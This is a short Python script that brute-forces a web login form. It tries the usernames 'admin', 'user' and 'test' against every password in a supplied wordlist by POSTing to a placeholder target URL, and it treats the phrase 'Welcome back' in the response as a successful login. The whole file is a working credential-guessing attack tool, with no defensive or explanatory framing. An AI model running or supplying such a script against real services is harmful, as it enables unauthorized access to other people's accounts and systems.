import requests
import sys

if len(sys.argv) !=2:
    print("Invalid argument!")
    print(">> {} </path/to/password.txt>".format(sys.argv[0]))

target = "http://target_url.com"
username = ["admin","user","test"]
password = sys.argv[1]
needle = "Welcome back" #some success response keyword

for username in username:
    with open(password, "r") as password_list:
        for password in password_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting User:Password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>] Valid password '{}' found for the user '{}'".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\t No password found for the user {}".format(username))
        sys.stdout.write("\n")